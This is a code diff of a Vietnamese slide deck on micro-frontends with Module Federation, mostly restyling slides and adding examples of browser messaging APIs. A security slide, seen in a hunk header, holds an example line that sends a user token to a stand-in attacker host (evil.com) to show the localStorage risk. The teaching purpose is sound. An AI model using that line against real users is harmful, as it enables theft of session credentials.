@@ -9,7 +9,10 @@ import {
     CSSIsolationDiagram,
     RoutingFlowDiagram,
     CICDPipelineDiagram,
-    EventBusDiagram
+    EventBusDiagram,
+    BroadcastChannelDiagram,
+    MessageChannelDiagram,
+    CustomEventDiagram
 } from '../diagrams';
 
 export interface SlideData {
@@ -62,37 +65,127 @@ export const slides: SlideData[] = [
     // PHẦN 1: GIỚI THIỆU (Slides 1-5)
     // ==========================================
 
-    // Slide 1: Title
+    // Slide 1: Title - Creative Design
     {
         id: 1,
         title: 'Micro-Frontend với Module Federation',
         section: 'Giới thiệu',
         variant: 'title',
         content: (
-            <div className="text-center">
+            <div className="relative text-center overflow-hidden">
+                {/* Dot grid background pattern */}
+                <div
+                    className="absolute inset-0 opacity-[0.15]"
+                    style={{
+                        backgroundImage: `radial-gradient(circle, rgba(255,255,255,0.3) 1px, transparent 1px)`,
+                        backgroundSize: '16px 16px'
+                    }}
+                />
+
+                {/* Floating gradient orbs */}
                 <motion.div
-                    className="text-6xl mb-6"
-                    animate={{ scale: [1, 1.05, 1] }}
-                    transition={{ repeat: Infinity, duration: 3 }}
+                    className="absolute -top-32 -left-32 w-96 h-96 rounded-full blur-3xl"
+                    style={{ background: 'radial-gradient(circle, rgba(56,189,248,0.3) 0%, transparent 70%)' }}
+                    animate={{
+                        x: [0, 50, 0],
+                        y: [0, 30, 0],
+                        scale: [1, 1.1, 1]
+                    }}
+                    transition={{ repeat: Infinity, duration: 8, ease: 'easeInOut' }}
+                />
+                <motion.div
+                    className="absolute -bottom-32 -right-32 w-80 h-80 rounded-full blur-3xl"
+                    style={{ background: 'radial-gradient(circle, rgba(168,85,247,0.4) 0%, transparent 70%)' }}
+                    animate={{
+                        x: [0, -40, 0],
+                        y: [0, -30, 0],
+                        scale: [1, 1.15, 1]
+                    }}
+                    transition={{ repeat: Infinity, duration: 10, ease: 'easeInOut' }}
+                />
+                <motion.div
+                    className="absolute top-1/2 left-1/4 w-64 h-64 rounded-full blur-3xl"
+                    style={{ background: 'radial-gradient(circle, rgba(236,72,153,0.25) 0%, transparent 70%)' }}
+                    animate={{
+                        x: [0, 30, 0],
+                        y: [0, -20, 0]
+                    }}
+                    transition={{ repeat: Infinity, duration: 12, ease: 'easeInOut' }}
+                />
+
+                {/* Glass card container */}
+                <motion.div
+                    className="relative z-10 p-12 rounded-3xl border border-white/10 shadow-2xl"
+                    style={{
+                        background: 'linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0.02) 100%)',
+                        backdropFilter: 'blur(20px)',
+                        boxShadow: '0 8px 32px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.1)'
+                    }}
+                    initial={{ opacity: 0, scale: 0.9, y: 30 }}
+                    animate={{ opacity: 1, scale: 1, y: 0 }}
+                    transition={{ duration: 0.6 }}
                 >
-                    🧩
+                    {/* Animated icon with glow */}
+                    <motion.div
+                        className="text-7xl mb-8 drop-shadow-2xl"
+                        animate={{
+                            scale: [1, 1.1, 1],
+                            filter: ['drop-shadow(0 0 20px rgba(56,189,248,0.5))', 'drop-shadow(0 0 40px rgba(168,85,247,0.6))', 'drop-shadow(0 0 20px rgba(56,189,248,0.5))']
+                        }}
+                        transition={{ repeat: Infinity, duration: 3 }}
+                    >
+                        🧩
+                    </motion.div>
+
+                    {/* Title with gradient text */}
+                    <motion.h1
+                        className="text-6xl font-bold mb-6 leading-tight"
+                        initial={{ opacity: 0, y: 20 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        transition={{ delay: 0.2 }}
+                    >
+                        <span
+                            className="bg-clip-text text-transparent"
+                            style={{ backgroundImage: 'linear-gradient(135deg, #38bdf8 0%, #818cf8 50%, #a855f7 100%)' }}
+                        >
+                            Micro-Frontend
+                        </span>
+                        <br />
+                        <span className="text-white/90">với </span>
+                        <span
+                            className="bg-clip-text text-transparent"
+                            style={{ backgroundImage: 'linear-gradient(135deg, #a855f7 0%, #ec4899 50%, #f97316 100%)' }}
+                        >
+                            Module Federation
+                        </span>
+                    </motion.h1>
+
+                    {/* Subtitle with glass pill */}
+                    <motion.div
+                        className="inline-block px-6 py-3 rounded-full border border-white/20"
+                        style={{
+                            background: 'linear-gradient(135deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0.05) 100%)',
+                            boxShadow: '0 4px 16px rgba(0,0,0,0.2), inset 0 1px 0 rgba(255,255,255,0.1)'
+                        }}
+                        initial={{ opacity: 0, y: 10 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        transition={{ delay: 0.4 }}
+                    >
+                        <span className="text-lg text-white/80">Từ cơ bản đến nâng cao</span>
+                    </motion.div>
+
+                    {/* Decorative line */}
+                    <motion.div
+                        className="mt-8 mx-auto h-1 rounded-full"
+                        style={{
+                            background: 'linear-gradient(90deg, transparent, rgba(168,85,247,0.6), rgba(56,189,248,0.6), transparent)',
+                            width: '200px'
+                        }}
+                        initial={{ scaleX: 0, opacity: 0 }}
+                        animate={{ scaleX: 1, opacity: 1 }}
+                        transition={{ delay: 0.6, duration: 0.8 }}
+                    />
                 </motion.div>
-                <motion.h1
-                    className="text-slide-title mb-4"
-                    initial={{ opacity: 0, y: 20 }}
-                    animate={{ opacity: 1, y: 0 }}
-                >
-                    <span className="text-[var(--accent-blue)]">Micro-Frontend</span>
-                    <br />với <span className="text-[var(--accent-purple)]">Module Federation</span>
-                </motion.h1>
-                <motion.p
-                    className="text-slide-body text-[var(--text-secondary)]"
-                    initial={{ opacity: 0 }}
-                    animate={{ opacity: 1 }}
-                    transition={{ delay: 0.3 }}
-                >
-                    Từ cơ bản đến nâng cao
-                </motion.p>
             </div>
         ),
     },
@@ -715,88 +808,164 @@ export default defineConfig({
     // Slide 21: Communication Overview
     {
         id: 21,
-        title: 'Cross-App Communication',
+        title: 'Các phương thức giao tiếp',
         section: 'Phần 4: Communication',
         content: (
             <div className="w-full max-w-5xl mx-auto">
-                <h2 className="text-slide-header mb-6">Các phương thức giao tiếp</h2>
+                <h2 className="text-slide-header mb-6">Các phương thức giao tiếp giữa MFE</h2>
                 <Table
                     headers={['Phương thức', 'Phạm vi', 'Ưu điểm', 'Nhược điểm']}
                     rows={[
-                        ['<span class="text-[var(--accent-blue)] font-bold">BroadcastChannel</span>', 'Cùng domain, nhiều tab', 'Đơn giản, built-in', 'Chỉ cùng domain'],
-                        ['<span class="text-[var(--accent-green)] font-bold">MessageChannel</span>', 'Cùng page, cross-origin', 'Nhanh, bidirectional', 'Setup phức tạp'],
-                        ['<span class="text-[var(--accent-purple)] font-bold">CustomEvent</span>', 'Cùng page', 'Rất đơn giản', 'Chỉ cùng page'],
-                        ['<span class="text-[var(--accent-orange)] font-bold">Event Bus</span>', 'Cùng page', 'Type-safe, flexible', 'Cần implement'],
+                        ['<span class="text-[var(--accent-blue)] font-bold">1. BroadcastChannel</span>', 'Cùng domain, nhiều tab', 'Đơn giản, có sẵn', 'Chỉ cùng domain'],
+                        ['<span class="text-[var(--accent-green)] font-bold">2. MessageChannel</span>', 'Cùng trang, khác origin', 'Nhanh, hai chiều', 'Cấu hình phức tạp'],
+                        ['<span class="text-[var(--accent-purple)] font-bold">3. CustomEvent</span>', 'Cùng trang', 'Rất đơn giản', 'Chỉ cùng trang'],
+                        ['<span class="text-[var(--accent-orange)] font-bold">4. Event Bus</span>', 'Cùng trang', 'An toàn kiểu, linh hoạt', 'Cần tự viết'],
                     ]}
                 />
+                <motion.div className="mt-4 glass p-4 rounded-lg text-sm text-center" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
+                    Các slide tiếp theo sẽ đi chi tiết từng phương thức theo thứ tự trên
+                </motion.div>
             </div>
         ),
     },
 
-    // Slide 22: Event Bus Definition
+    // Slide 22: BroadcastChannel - Giới thiệu + Diagram
     {
         id: 22,
-        title: 'Event Bus là gì?',
-        section: 'Phần 4: Communication',
-        variant: 'section',
-        content: (
-            <div className="w-full max-w-4xl mx-auto">
-                <h2 className="text-slide-header mb-6">Event Bus là gì?</h2>
-                <motion.div className="glass p-6 rounded-xl mb-6" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
-                    <p className="text-slide-body leading-relaxed">
-                        <span className="text-[var(--accent-cyan)] font-semibold">Event Bus</span> là pattern cho phép các component/micro-frontend
-                        <span className="text-[var(--accent-green)]"> giao tiếp với nhau</span> mà không cần biết về sự tồn tại của nhau.
-                    </p>
-                </motion.div>
-                <div className="grid grid-cols-3 gap-4">
-                    {[
-                        { icon: '📤', title: 'Publisher', desc: 'Gửi event + data', color: 'blue' },
-                        { icon: '🚌', title: 'Event Bus', desc: 'Trung gian điều phối', color: 'purple' },
-                        { icon: '📥', title: 'Subscriber', desc: 'Nhận và xử lý event', color: 'green' },
-                    ].map((item, i) => (
-                        <motion.div
-                            key={item.title}
-                            className={`glass p-5 rounded-lg text-center border-2 border-[var(--accent-${item.color})]/30`}
-                            initial={{ opacity: 0, y: 20 }}
-                            animate={{ opacity: 1, y: 0 }}
-                            transition={{ delay: 0.2 + i * 0.1 }}
-                        >
-                            <div className="text-3xl mb-2">{item.icon}</div>
-                            <h4 className={`text-[var(--accent-${item.color})] font-bold`}>{item.title}</h4>
-                            <p className="text-xs text-[var(--text-secondary)] mt-1">{item.desc}</p>
-                        </motion.div>
-                    ))}
-                </div>
-                <motion.div className="mt-6 glass p-4 rounded-lg text-sm text-center" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.5 }}>
-                    <strong className="text-[var(--accent-cyan)]">💡 Lợi ích:</strong> Loose coupling - các MFE không phụ thuộc trực tiếp vào nhau!
-                </motion.div>
-            </div>
-        ),
-    },
-
-    // Slide 22: Event Bus Diagram
-    {
-        id: 23,
-        title: 'Event Bus Pattern',
+        title: '1. BroadcastChannel',
         section: 'Phần 4: Communication',
         variant: 'diagram',
         content: (
             <div className="w-full max-w-5xl mx-auto">
-                <h2 className="text-slide-header mb-6">Event Bus Pattern (Pub/Sub)</h2>
-                <EventBusDiagram />
+                <h2 className="text-slide-header mb-4">BroadcastChannel - Giao tiếp giữa các Tab</h2>
+                <BroadcastChannelDiagram />
+                <motion.div className="mt-4 glass p-4 rounded-lg text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.5 }}>
+                    <strong className="text-[var(--accent-blue)]">Use case:</strong> Đồng bộ trạng thái giữa nhiều tab (logout, theme, ngôn ngữ)
+                </motion.div>
             </div>
         ),
     },
 
-    // Slide 23: Event Bus Implementation
+    // Slide 23: BroadcastChannel - Code
+    {
+        id: 23,
+        title: 'BroadcastChannel - Code',
+        section: 'Phần 4: Communication',
+        variant: 'code',
+        content: (
+            <div className="w-full max-w-5xl mx-auto">
+                <h2 className="text-slide-header mb-4">BroadcastChannel - Ví dụ Code</h2>
+                <div className="grid grid-cols-2 gap-4">
+                    <CodeBlock
+                        title="Tab A - Gửi message"
+                        language="typescript"
+                        showLineNumbers={false}
+                        code={`// Tạo channel
+const channel = new BroadcastChannel('mfe-sync');
+
+// Khi user logout
+function logout() {
+  channel.postMessage({ type: 'LOGOUT' });
+}`}
+                    />
+                    <CodeBlock
+                        title="Tab B - Nhận message"
+                        language="typescript"
+                        showLineNumbers={false}
+                        code={`// Lắng nghe từ các tab khác
+channel.onmessage = (event) => {
+  if (event.data.type === 'LOGOUT') {
+    // Logout ở tab này
+    clearToken();
+    redirect('/login');
+  }
+};`}
+                    />
+                </div>
+            </div>
+        ),
+    },
+
+    // Slide 24: MessageChannel - Diagram
     {
         id: 24,
-        title: 'Event Bus Implementation',
+        title: '2. MessageChannel',
+        section: 'Phần 4: Communication',
+        variant: 'diagram',
+        content: (
+            <div className="w-full max-w-5xl mx-auto">
+                <h2 className="text-slide-header mb-4">MessageChannel - Giao tiếp trực tiếp 2 chiều</h2>
+                <MessageChannelDiagram />
+                <motion.div className="mt-4 glass p-4 rounded-lg text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.5 }}>
+                    <strong className="text-[var(--accent-green)]">Use case:</strong> Giao tiếp giữa iframe (cross-origin) hoặc Web Worker
+                </motion.div>
+            </div>
+        ),
+    },
+
+    // Slide 25: CustomEvent - Diagram + Code
+    {
+        id: 25,
+        title: '3. CustomEvent',
+        section: 'Phần 4: Communication',
+        variant: 'code',
+        content: (
+            <div className="w-full max-w-5xl mx-auto">
+                <h2 className="text-slide-header mb-4">CustomEvent - Đơn giản nhất</h2>
+                <div className="grid grid-cols-2 gap-4">
+                    <div>
+                        <CustomEventDiagram />
+                    </div>
+                    <CodeBlock
+                        title="Ví dụ sử dụng"
+                        language="typescript"
+                        showLineNumbers={false}
+                        code={`// Remote A - Gửi event
+window.dispatchEvent(
+  new CustomEvent('user:selected', {
+    detail: { userId: '123' }
+  })
+);
+
+// Remote B - Lắng nghe
+window.addEventListener('user:selected', 
+  (e) => console.log(e.detail.userId)
+);`}
+                    />
+                </div>
+                <motion.div className="mt-4 glass p-4 rounded-lg text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
+                    <strong className="text-[var(--accent-purple)]">Ưu điểm:</strong> Không cần thư viện, sử dụng API có sẵn của trình duyệt
+                </motion.div>
+            </div>
+        ),
+    },
+
+    // Slide 26: Event Bus - Diagram
+    {
+        id: 26,
+        title: '4. Event Bus',
+        section: 'Phần 4: Communication',
+        variant: 'diagram',
+        content: (
+            <div className="w-full max-w-5xl mx-auto">
+                <h2 className="text-slide-header mb-4">Event Bus - Pattern Pub/Sub</h2>
+                <EventBusDiagram />
+                <motion.div className="mt-4 glass p-4 rounded-lg text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.5 }}>
+                    <strong className="text-[var(--accent-orange)]">Lợi ích:</strong> Loose coupling - các MFE không phụ thuộc trực tiếp vào nhau, dễ kiểm soát types
+                </motion.div>
+            </div>
+        ),
+    },
+
+    // Slide 27: Event Bus - Code
+    {
+        id: 27,
+        title: 'Event Bus - Code',
         section: 'Phần 4: Communication',
         variant: 'code',
         content: (
             <div className="w-full max-w-4xl mx-auto">
-                <h2 className="text-slide-header mb-4">Event Bus Implementation</h2>
+                <h2 className="text-slide-header mb-4">Event Bus - Triển khai</h2>
                 <CodeBlock
                     title="shared/utils/eventBus.ts"
                     language="typescript"
@@ -808,11 +977,7 @@ class EventBus {
   on(event: string, callback: EventCallback): () => void {
     if (!this.events.has(event)) this.events.set(event, []);
     this.events.get(event)!.push(callback);
-    // Return unsubscribe function
-    return () => {
-      const cbs = this.events.get(event);
-      if (cbs) cbs.splice(cbs.indexOf(callback), 1);
-    };
+    return () => this.off(event, callback); // Hàm hủy đăng ký
   }
 
   emit(event: string, data?: unknown): void {
@@ -821,77 +986,33 @@ class EventBus {
 }
 
 export const eventBus = new EventBus();`}
-                    highlightLines={[6, 7, 8, 16, 17]}
+                    highlightLines={[6, 7, 8, 12, 13]}
                 />
             </div>
         ),
     },
 
-    // Slide 24: BroadcastChannel
+    // Slide 28: Token Sync Flow
     {
-        id: 25,
-        title: 'BroadcastChannel API',
-        section: 'Phần 4: Communication',
-        variant: 'code',
-        content: (
-            <div className="w-full max-w-5xl mx-auto">
-                <h2 className="text-slide-header mb-4">BroadcastChannel - Cross-Tab Communication</h2>
-                <div className="grid grid-cols-2 gap-4">
-                    <CodeBlock
-                        title="Gửi message"
-                        language="typescript"
-                        showLineNumbers={false}
-                        code={`// Tạo channel
-const channel = new BroadcastChannel('mfe-events');
-
-// Gửi message
-channel.postMessage({ 
-  type: 'user:selected', 
-  userId: '123' 
-});`}
-                    />
-                    <CodeBlock
-                        title="Nhận message"
-                        language="typescript"
-                        showLineNumbers={false}
-                        code={`// Lắng nghe
-channel.onmessage = (event) => {
-  const { type, userId } = event.data;
-  
-  if (type === 'user:selected') {
-    console.log('User selected:', userId);
-  }
-};`}
-                    />
-                </div>
-                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-green)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }}>
-                    <strong className="text-[var(--accent-green)]">✅ Use case:</strong> Sync trạng thái giữa nhiều tab của cùng một domain (ví dụ: logout tất cả tab).
-                </motion.div>
-            </div>
-        ),
-    },
-
-    // Slide 25: Token Sync Flow
-    {
-        id: 26,
-        title: 'Token Sync Strategy',
+        id: 28,
+        title: 'Ứng dụng: Đồng bộ Token',
         section: 'Phần 4: Communication',
         variant: 'diagram',
         content: (
             <div className="w-full max-w-5xl mx-auto">
-                <h2 className="text-slide-header mb-6">Token Sync giữa các MFE</h2>
+                <h2 className="text-slide-header mb-6">Ví dụ thực tế: Đồng bộ Token giữa các MFE</h2>
                 <TokenSyncFlowDiagram />
             </div>
         ),
     },
 
     // ==========================================
-    // PHẦN 5: SECURITY (Slides 26-28)
+    // PHẦN 5: SECURITY (Slides 29-31)
     // ==========================================
 
-    // Slide 26: Token Storage Problem
+    // Slide 29: Token Storage Problem
     {
-        id: 27,
+        id: 29,
         title: 'Vấn đề với localStorage',
         section: 'Phần 5: Security',
         variant: 'code',
@@ -918,10 +1039,10 @@ fetch('https://evil.com?token=' + token);`}
                     <motion.div className="glass p-5 rounded-lg border-2 border-[var(--accent-green)]/50" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.1 }}>
                         <h4 className="text-[var(--accent-green)] font-bold mb-3">✅ An toàn hơn: Memory Storage</h4>
                         <Table
-                            headers={['Token', 'Storage', 'JS Access?']}
+                            headers={['Token', 'Lưu trữ', 'JS truy cập?']}
                             rows={[
-                                ['Access Token', 'Memory (JS var)', '✅ Yes'],
-                                ['Refresh Token', 'httpOnly Cookie', '❌ No'],
+                                ['Access Token', 'Bộ nhớ (biến JS)', '✅ Có'],
+                                ['Refresh Token', 'httpOnly Cookie', '❌ Không'],
                             ]}
                         />
                     </motion.div>
